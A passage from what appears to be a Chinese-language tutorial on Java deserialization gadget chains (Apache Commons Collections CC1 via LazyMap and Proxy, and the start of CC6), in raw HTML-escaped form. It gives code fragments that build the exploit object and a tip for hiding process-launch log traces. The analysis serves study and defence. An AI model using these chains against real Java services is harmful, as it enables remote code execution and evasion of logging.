&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">isApplicableJavaVersion&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">JavaVersion&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isAnnInvHUniversalMethodImpl&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ysoserial用的是与TransformedMap类似的LazyMap，两者的区别在于TransformedMap是在执行put操作时回调transform，而LazyMap是在get方法中执行的factory.transform，在get找不到值才会调用factory.transform去获取一个值（所谓Lazy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">containsKey&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">transform&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>LazyMap的利用比TransformedMap复杂，因为AnnotationInvocationHandler覆写的readObject中并没有直接使用Map的get，所以这里选择通过java对象代理的技术来触发它的invoke 进而到get&lt;/p>
&lt;p>我们知道对象代理可以在运行期动态创建某个&lt;code>interface&lt;/code>的实例，可以编写&lt;code>InvocationHandler&lt;/code>来实现接口的方法调用，可以做到加工和覆写（也正是叫做Proxy的原因 对接口进行Proxy 省去中间类），类似PHP魔术方法中的&lt;code>__call&lt;/code> 可以劫持对象内部的方法调用，用到java.reflect.Proxy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>第一个参数ClassLoader我们使用默认的即可，第二个是我们需要代理的对象集合，第三个参数是一个实现了InvocationHandler接口的对象，里面包含了具体的代理逻辑&lt;/p>
&lt;p>比如一个覆写了invoke方法的ExampleInvocationHandler类&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">ExampleInvocationHandler&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">ExampleInvocationHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">proxy&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Throwable&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">compareTo&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;get&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Hookmethod: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hacked Object&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">method&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>作用是监控到调用的方法名是get时返回Hacked Object字符串，我们尝试外部调用它&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.InvocationHandler&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Proxy&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.HashMap&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">App&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ExampleInvocationHandler&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">proxyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;world&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;hello&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>回显Hook methd: get Hacked Object&lt;/p>
&lt;p>回看&lt;code>sun.reflect.annotation.AnnotationInvocationHandler&lt;/code>，如果我们把这个对象用Proxy进行代理，那么readObject时只要调用任意方法 就会进入&lt;code>AnnotationInvocationHandler#invoke&lt;/code>触发get&lt;/p>
&lt;h4 id="构造">构造&lt;/h4>
&lt;p>先是用LazyMap替换TransformedMap&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">outerMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">innerMap&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后对sun.reflect.annotation.AnnotationInvocationHandler进行Proxy&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;sun.reflect.annotation.AnnotationInvocationHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Constructor&lt;/span> &lt;span style="color:#111">construct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredConstructor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">InvocationHandler&lt;/span> &lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">outerMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">Proxy&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newProxyInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClassLoader&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>代理后的对象是proxyMap，但是不能直接对其序列化 我们的入口点是&lt;code>sun.reflect.annotation.AnnotationInvocationHandler#readObject&lt;/code>，还要再用AnnotationInvocationHandler对这个proxyMap包裹&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">handler&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">InvocationHandler&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">construct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">newInstance&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Retention&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">proxyMap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意到ysoserial的末尾有new ConstantTransformer(1)，可以隐藏启动进程的日志特征&lt;/p>
&lt;p>————注意：LazyMap的CC1同样无法解决8u71后的使用问题，尽管它的漏洞触发在get和invoke，和setValue无关&lt;/p>
&lt;h2 id="cc6">CC6&lt;/h2>
&lt;p>上面提到CC1由于&lt;code>sun.reflect.annotation.AnnotationInvocationHandler#readObject&lt;/code>在8u71后的逻辑变化导致失效，这里来看一条解决高版本Java利用的CC6（代码部分来自p牛&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">/*
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> -&amp;gt; Gadget chain:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.io.ObjectInputStream.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.util.HashMap.readObject()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.util.HashMap.hash()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> org.apache.commons.collections.map.LazyMap.get()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.functors.ChainedTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">org.apache.commons.collections.functors.InvokerTransformer.transform()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.lang.reflect.Method.invoke()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> java.lang.Runtime.exec()
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">*/&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>CC6解决CC1的方案是在上下文中寻找其它可以调用&lt;code>LazyMap.get&lt;/code>的地方，用到的是&lt;code>org.apache.commons.collections.keyvalue.TiedMapEntry&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">package&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.keyvalue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.Serializable&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Map.Entry&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections.KeyValue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TiedMapEntry&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Entry&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">KeyValue&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Serializable&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">serialVersionUID&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">8453869361373831205L&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
